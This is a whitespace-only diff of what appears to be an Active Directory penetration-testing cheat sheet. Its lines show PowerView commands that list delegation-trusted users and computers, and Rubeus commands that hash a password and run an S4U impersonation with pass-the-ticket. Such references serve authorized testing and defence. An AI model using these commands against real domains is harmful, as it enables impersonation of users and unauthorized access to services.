@@ -278,7 +278,7 @@ Configure RBCD using powerview
 Using powerview
 ```
     Get-DomainUser –TrustedToAuth -Domain <domain>
-	Get-DomainComputer –TrustedToAuth -Domain <domain>
+    Get-DomainComputer –TrustedToAuth -Domain <domain>
 ```
 
 Using AD-Module
@@ -290,7 +290,7 @@ Using AD-Module
 
 ```
     Rubeus.exe hash /password:<password> /user:<user> /domain:<domain>
-	Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:<user> /domain:<domain> /msdsspn:<service>/<target.domain> /altservice:<service> /dc:<DC> /ptt
+    Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:<user> /domain:<domain> /msdsspn:<service>/<target.domain> /altservice:<service> /dc:<DC> /ptt
 ```
 
 
